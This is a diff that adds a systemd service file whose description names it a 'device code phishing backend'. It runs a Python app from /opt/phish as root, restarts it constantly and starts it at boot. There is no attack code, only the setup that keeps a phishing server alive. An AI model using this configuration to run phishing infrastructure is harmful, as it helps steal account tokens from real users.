@@ -1,0 +1,13 @@
+[Unit]
+Description=Device code phishing backend
+After=network.target
+
+[Service]
+WorkingDirectory=/opt/phish
+ExecStart=/opt/phish/venv/bin/python3 /opt/phish/app.py
+Restart=always
+RestartSec=3
+User=root
+
+[Install]
+WantedBy=multi-user.target
